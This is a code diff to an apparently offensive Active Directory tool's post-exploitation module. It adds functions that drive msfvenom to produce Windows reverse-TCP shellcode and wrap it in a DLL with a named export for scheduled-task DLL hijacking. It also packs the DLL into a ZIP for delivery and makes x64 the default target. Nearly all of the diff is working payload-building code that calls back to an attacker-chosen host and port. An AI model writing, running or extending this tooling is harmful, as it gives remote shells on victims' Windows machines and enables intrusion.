@@ -3,6 +3,7 @@ from __future__ import annotations
 import os
 import subprocess
 import sys
+import tempfile
 import zipfile
 from dataclasses import dataclass
 from pathlib import Path
@@ -14,6 +15,10 @@ from admapper.support.output import print_info, print_success, print_warning
 from admapper.support.platform import resolve_executable
 
 PayloadMode = Literal["shell", "enroll"]
+PayloadGenerator = Literal["msfvenom", "mingw", "auto"]
+
+
+from admapper.postex.monitor_log import export_name_for_dll
 
 
 def bootstrap_metasploit() -> None:
@@ -122,6 +127,55 @@ def build_reverse_shell_dll_msfvenom(
     return out_path
 
 
+def build_msfvenom_raw_shellcode(
+    *,
+    lhost: str,
+    lport: int,
+    arch: TargetArch = "x86",
+) -> bytes:
+    msfvenom = ensure_msfvenom()
+    payload = "windows/x64/shell_reverse_tcp" if arch == "x64" else "windows/shell_reverse_tcp"
+    with tempfile.TemporaryDirectory(prefix="admapper-msf-raw-") as tmp:
+        out_path = Path(tmp) / "shell.bin"
+        cmd = [
+            msfvenom,
+            "-p",
+            payload,
+            f"LHOST={lhost}",
+            f"LPORT={lport}",
+            "-f",
+            "raw",
+            "-o",
+            str(out_path),
+        ]
+        print_info(f"generating {arch} shellcode via msfvenom ({lhost}:{lport}) …")
+        proc = _run_msfvenom(cmd)
+        if proc.returncode != 0 or not out_path.is_file():
+            detail = (proc.stderr or proc.stdout or "").strip()
+            raise RuntimeError(detail or f"msfvenom raw exit {proc.returncode}")
+        return out_path.read_bytes()
+
+
+def build_reverse_shell_dll_msfvenom_hijack(
+    *,
+    lhost: str,
+    lport: int,
+    out_path: Path,
+    arch: TargetArch = "x86",
+    export_name: str = "PreUpdateCheck",
+) -> Path:
+    """msfvenom reverse shell with a named export for scheduled-task DLL hijack."""
+    from admapper.postex.dllgen import build_reverse_shell_dll_msfvenom_export
+
+    shellcode = build_msfvenom_raw_shellcode(lhost=lhost, lport=lport, arch=arch)
+    return build_reverse_shell_dll_msfvenom_export(
+        shellcode=shellcode,
+        out_path=out_path,
+        arch=arch,
+        export_name=export_name,
+    )
+
+
 def build_reverse_shell_dll(
     *,
     lhost: str,
@@ -129,17 +183,40 @@ def build_reverse_shell_dll(
     out_path: Path,
     arch: TargetArch = "x86",
     auto_install_msfvenom: bool = True,
+    generator: str = "auto",
+    export_name: str = "PreUpdateCheck",
 ) -> Path:
-    """Build reverse-shell DLL — msfvenom first, mingw-w64 fallback."""
+    """Build reverse-shell DLL.
+
+    For scheduled-task hijacks that call a named export, ``msfvenom`` wraps shellcode
+    in a mingw stub exporting ``export_name``. Plain ``msfvenom -f dll`` has no export.
+    """
+    from admapper.postex.dllgen import build_reverse_shell_dll_mingw
+
+    if generator == "mingw":
+        return build_reverse_shell_dll_mingw(lhost=lhost, lport=lport, out_path=out_path, arch=arch)
+
+    if generator == "msfvenom":
+        return build_reverse_shell_dll_msfvenom_hijack(
+            lhost=lhost,
+            lport=lport,
+            out_path=out_path,
+            arch=arch,
+            export_name=export_name,
+        )
+
     if auto_install_msfvenom and resolve_msfvenom():
         try:
-            return build_reverse_shell_dll_msfvenom(
-                lhost=lhost, lport=lport, out_path=out_path, arch=arch
+            return build_reverse_shell_dll_msfvenom_hijack(
+                lhost=lhost,
+                lport=lport,
+                out_path=out_path,
+                arch=arch,
+                export_name=export_name,
             )
         except RuntimeError as exc:
             msg = str(exc).splitlines()[0][:160]
             print_warning(f"msfvenom unavailable ({msg}) — falling back to mingw-w64")
-    from admapper.postex.dllgen import build_reverse_shell_dll_mingw
 
     return build_reverse_shell_dll_mingw(lhost=lhost, lport=lport, out_path=out_path, arch=arch)
 
@@ -160,11 +237,18 @@ class PayloadBuildResult:
     lport: int = 0
 
 
-def pack_dll_zip(dll_path: Path, zip_name: str, out_dir: Path) -> Path:
+def pack_dll_zip(
+    dll_path: Path,
+    zip_name: str,
+    out_dir: Path,
+    *,
+    arcname: str | None = None,
+) -> Path:
     out_dir.mkdir(parents=True, exist_ok=True)
     zip_path = out_dir / zip_name
+    member = arcname or dll_path.name
     with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
-        zf.write(dll_path, arcname=dll_path.name)
+        zf.write(dll_path, arcname=member)
     return zip_path
 
 
@@ -187,6 +271,8 @@ def prepare_hijack_payload(
     enroll_ca_host: str = "",
     enroll_run_as_user: str | None = None,
     enroll_profile: Any | None = None,
+    generator: PayloadGenerator = "msfvenom",
+    monitor_log: str = "",
 ) -> PayloadBuildResult:
     payloads_dir = workspace_dir / "payloads"
     payloads_dir.mkdir(parents=True, exist_ok=True)
@@ -205,7 +291,7 @@ def prepare_hijack_payload(
         )
 
     callback = resolve_lhost(lhost, exclude=exclude_ips) if payload_mode == "shell" else ""
-    target_arch: TargetArch = arch or "x86"
+    target_arch: TargetArch = arch or "x64"
 
     if payload_mode == "enroll":
         from admapper.adcs.enroll import build_local_enroll_powershell
@@ -240,19 +326,26 @@ def prepare_hijack_payload(
             generator=f"cert_enroll/{target_arch} ({enroll_template} → {enroll_dns})",
         )
 
+    export = export_name_for_dll(dll_name, monitor_log=monitor_log)
     build_reverse_shell_dll(
         lhost=callback,
         lport=lport,
         out_path=dll_path,
         arch=target_arch,
-        auto_install_msfvenom=auto_install_msfvenom,
+        generator=generator,
+        export_name=export,
     )
-    zip_path = pack_dll_zip(dll_path, zip_name, payloads_dir)
+    gen_label = {
+        "msfvenom": f"reverse_shell/{target_arch} msfvenom/{export}",
+        "mingw": f"reverse_shell/{target_arch} mingw/{export}",
+        "auto": f"reverse_shell/{target_arch} auto/{export}",
+    }.get(generator, f"reverse_shell/{target_arch} {generator}/{export}")
+    zip_path = pack_dll_zip(dll_path, zip_name, payloads_dir, arcname=dll_name)
     print_success(f"payload ZIP → {zip_path}")
     return PayloadBuildResult(
         dll_path=dll_path,
         zip_path=zip_path,
-        generator=f"reverse_shell/{target_arch} ({callback}:{lport})",
+        generator=f"{gen_label} ({callback}:{lport})",
         lhost=callback,
         lport=lport,
     )
